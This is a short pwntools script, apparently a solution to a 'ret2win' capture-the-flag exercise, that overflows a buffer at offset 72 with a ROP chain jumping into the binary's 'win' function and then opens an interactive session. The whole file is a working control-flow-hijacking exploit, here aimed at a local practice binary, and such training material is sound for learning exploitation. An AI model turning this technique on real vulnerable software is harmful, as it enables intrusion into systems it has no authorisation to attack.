from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.call(elf.symbols["win"] + 68)

r = process("./ret2win")

payload = flat({72: rop.chain()})
r.recvuntil(b"a joke")
r.sendline(payload)

r.interactive()

